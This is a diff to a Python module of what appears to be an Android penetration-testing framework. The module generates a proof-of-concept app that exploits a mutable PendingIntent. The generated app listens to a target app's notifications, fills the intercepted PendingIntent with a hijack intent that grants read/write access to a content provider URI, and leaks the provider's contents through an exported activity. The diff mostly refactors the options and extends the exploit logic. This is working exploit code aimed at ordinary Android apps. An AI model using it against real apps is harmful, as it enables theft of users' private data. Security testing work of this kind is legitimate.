@@ -22,15 +22,18 @@ class SherlockModule(App):
 
     def register_options(self):
         option_state.add_options([
-            OptBool("IS_EXPORTED", [True, "Whether the target class is exported (Default: True)", True]),
-            OptBool("VIA_DEEPLINK", [True, "Communicate to target via deeplink (Default: False)", False]),
+            OptBool("IS_EXPORTED", [True, "Whether the target class is exported (Default: True)", False]),
+            OptBool("VIA_DEEPLINK", [False, "Communicate to target via deeplink (Default: False)", False]),
             OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
-            OptList("INTENT_EXTRA", [False, "Intent extra data"]),
-            OptEnum("PROVIDER_TYPE", [True, "Content provider type (1: Share content, 2: Access to files)", 1, [1, 2]]),
             OptStr("PROVIDER_URI", [True, "Content provider URI to access"]),
             OptStr("TARGET_PACKAGE", [True, "Target package name"]),
-            OptStr("TARGET_CLASS", [True, "Target class name"]),
-            OptInt("REQUEST_CODE", [True, "Pending intent request code"])
+            OptStr("TARGET_CLASS", [False, "Target class name"]),
+            OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
+            OptStr("BUNDLE_PARCEL", [False, "Parcel bundle key"]),
+            OptStr("BASE_ACTION", [False, "Base intent action to intercept"]),
+            OptInt("REQUEST_CODE", [True, "Pending intent request code"]),
+            OptEnum("PROVIDER_TYPE", [True, "Content provider type (1: Share content, 2: Access to files)", 1, [1, 2]]),
+            OptList("PUT_EXTRA", [False, "Intent extra data"]),
         ])
         self.update_option_status()
 
@@ -40,10 +43,10 @@ class SherlockModule(App):
         stat_dict = {
             "via_deeplink": {
                 "pos": ["deeplink_uri"],
-                "neg": ["target_class"]
+                "neg": []
             },
             "is_exported": {
-                "pos": ["via_deeplink"],
+                "pos": ["via_deeplink", "target_class"],
                 "neg": []
             },
         }
@@ -52,6 +55,19 @@ class SherlockModule(App):
 
     def execute(self):
         opts = self.get_options_value()
+
+        is_exported = opts['IS_EXPORTED']
+        via_deeplink = opts['VIA_DEEPLINK']
+        deeplink_uri = opts['DEEPLINK_URI']
+        provider_uri = opts['PROVIDER_URI']
+        target_package = opts['TARGET_PACKAGE']
+        target_class = opts['TARGET_CLASS']
+        bundle_extra = opts['BUNDLE_EXTRA']
+        bundle_parcel = opts['BUNDLE_PARCEL']
+        base_action = opts['BASE_ACTION']
+        request_code = opts['REQUEST_CODE']
+        provider_type = opts['PROVIDER_TYPE']
+        put_extra = opts['PUT_EXTRA']
 
         manifest = [
             self._template.build_manifest_component(
@@ -64,16 +80,16 @@ class SherlockModule(App):
                 category=[]
             ),
             self._template.build_manifest_component(
-                self.leak_provider_activity_name(self._id, opts['TARGET_PACKAGE']),
+                self.leak_provider_activity_name(self._id, target_package),
                 is_exported=True,
                 intercept=True,
-                action="sherlock.poc.MUTABLE_PENDING_INTENT_NOTIF"
+                action="sherlock.poc.MUTABLE_PENDING_INTENT_NOTIF" if base_action == "" else base_action
             ),
             self._template.build_manifest_component(
                 self.activity_name(self._id, "enable.notification.access")
             ),
             self._template.build_manifest_component(
-                self.activity_name(self._id, opts['TARGET_PACKAGE'])
+                self.activity_name(self._id, target_package)
             )
         ]
 
@@ -105,20 +121,22 @@ class SherlockModule(App):
                 "android.service.notification.StatusBarNotification"
             ],
             on_notif_posted=[
+                f'if (!sbn.getPackageName().equals("{target_package}")) {{ return; }}',
+                f'Bundle bundle = getIntent().getBundleExtra("{bundle_extra}");\nPendingIntent pi = bundle.getParcelable("{bundle_parcel}");' if bundle_extra != "" else "",
                 "PendingIntent pi = sbn.getNotification().contentIntent;",
                 self._template.build_intent(
-                    intent_var="hijackIntent",
-                    set_action="sherlock.poc.MUTABLE_PENDING_INTENT_NOTIF",
-                    set_clipdata=opts['PROVIDER_URI'],
+                    intent_var="hijack",
+                    set_action="sherlock.poc.MUTABLE_PENDING_INTENT_NOTIF" if base_action == "" else base_action,
+                    set_clipdata=provider_uri,
                     set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"],
                     start_activity=False
                 ),
-                f"try {{ pi.send(this, {opts['REQUEST_CODE']}, hijackIntent, null, null); }} catch (PendingIntent.CanceledException e) {{ Log.e(\"FAILED\", \"Failed to send pending intent: \" + e); }}"
+                f"try {{ pi.send(this, {request_code}, hijack, null, null); }} catch (PendingIntent.CanceledException e) {{ throw new RuntimeException(e); }}"
             ]
         )
 
         leak_provider_activity = self._template.build_activity(
-            name=self.leak_provider_activity_name(self._id, opts['TARGET_PACKAGE']),
+            name=self.leak_provider_activity_name(self._id, target_package),
             libs=[
                 "android.content.Context",
                 "android.content.Intent",
@@ -139,12 +157,12 @@ class SherlockModule(App):
             ],
             on_create=[
                 "Uri uri = getIntent().getClipData().getItemAt(0).getUri();",
-                self._template.resolve_content(opts['PROVIDER_TYPE'])
+                self._template.resolve_content(provider_type)
             ]
         )
 
         exploit_activity = self._template.build_activity(
-            name=self.activity_name(self._id, opts['TARGET_PACKAGE']),
+            name=self.activity_name(self._id, target_package),
             libs=[
                 "android.content.Context",
                 "android.content.Intent",
@@ -154,10 +172,10 @@ class SherlockModule(App):
             ],
             bind_button=True,
             on_create=[self._template.build_intent(
-                set_action="android.intent.action.VIEW" if opts['VIA_DEEPLINK'] else None,
-                set_data=f"\"{opts['DEEPLINK_URI']}\"" if opts['VIA_DEEPLINK'] else None,
-                put_extra=[[extra[0], f"\"{extra[1]}\""] for extra in opts['INTENT_EXTRA']] if opts['INTENT_EXTRA'] != "" else [],
-                set_classname=[opts['TARGET_PACKAGE'], opts['TARGET_CLASS']] if not opts['VIA_DEEPLINK'] else []
+                set_action="android.intent.action.VIEW" if via_deeplink else None,
+                set_data=f'"{deeplink_uri}"' if via_deeplink else None,
+                put_extra=[[extra[0], f'"{extra[1]}"'] for extra in put_extra] if put_extra != "" else [],
+                set_classname=[target_package, target_class] if not via_deeplink else []
             )]
         )
 
@@ -171,26 +189,26 @@ class SherlockModule(App):
                 "content": notif_listener_service
             },
             {
-                "name": f"{self.leak_provider_activity_name(self._id, opts['TARGET_PACKAGE'])}.java",
+                "name": f"{self.leak_provider_activity_name(self._id, target_package)}.java",
                 "content": leak_provider_activity 
             },
             {
-                "name": f"{self.activity_name(self._id, opts['TARGET_PACKAGE'])}.java",
+                "name": f"{self.activity_name(self._id, target_package)}.java",
                 "content": exploit_activity 
             }
         ]
 
         button_layout = [
             self._template.button_layout(self._id, "enable.notification.access"),
-            self._template.button_layout(self._id, opts['TARGET_PACKAGE'])
+            self._template.button_layout(self._id, target_package)
         ]
 
         bind_button = [
             self._template.bind_button(self._id, "enable.notification.access"),
-            self._template.bind_button(self._id, opts['TARGET_PACKAGE'])
+            self._template.bind_button(self._id, target_package)
         ]
 
-        if not opts['IS_EXPORTED']:
+        if not is_exported:
             manifest.pop()
             component.pop()
             button_layout.pop()
@@ -203,39 +221,11 @@ class SherlockModule(App):
             "component": component
         }
 
-        stat = {
-            "failed": [
-                {
-                    "regex": r"^.*java\.lang\.SecurityException:.*$",
-                    "msg": r"java\.lang\.SecurityException:.*"
-                },
-                {
-                    "regex": r"^.*java\.lang\.NullPointerException:.*$",
-                    "msg": r"java\.lang\.NullPointerException:.*"
-                },
-                {
-                    "regex": r"^.*java\.lang\.RuntimeException:.*$",
-                    "msg": r"java\.lang\.RuntimeException:.*"
-                }
-            ],
-            "succeed": {
-                "regex": r"^.*ELEMENTARY!!!.*$",
-                "data": r"Data:.*"
-            }
-        }
-
         build_app = self.build(app)
         if not build_app:
             log.error("Module failed to execute, terminating module..\n")
             return
         
-        if opts['IS_EXPORTED']:
-            log.warning("Press the button displayed to execute the exploit module.")
-        else:
-            log.warning(f"Navigate to target class: \"{opts['TARGET_CLASS']}\" and trigger the pending intent.")
+        self.check_component_log(opts)
 
-        self.check_logcat(stat)
-
-
-# DONE
-# RETESTED
+        self.check_logcat()
